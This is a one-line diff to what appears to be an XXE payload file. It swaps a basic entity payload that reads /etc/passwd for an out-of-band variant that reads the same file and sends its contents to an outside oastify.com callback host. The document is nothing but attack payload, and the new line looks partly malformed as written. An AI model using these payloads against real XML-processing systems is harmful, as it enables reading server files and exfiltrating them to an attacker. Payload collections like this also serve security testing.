@@ -1,1 +1,1 @@
-<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "file:///etc/passwd" ><!ENTITY callhome SYSTEM "s2v9p0ybqqvfd5dea82s0o6cp3vujlg95.oastify.com/?%xxe;">]><foo>&callhome;</foo>
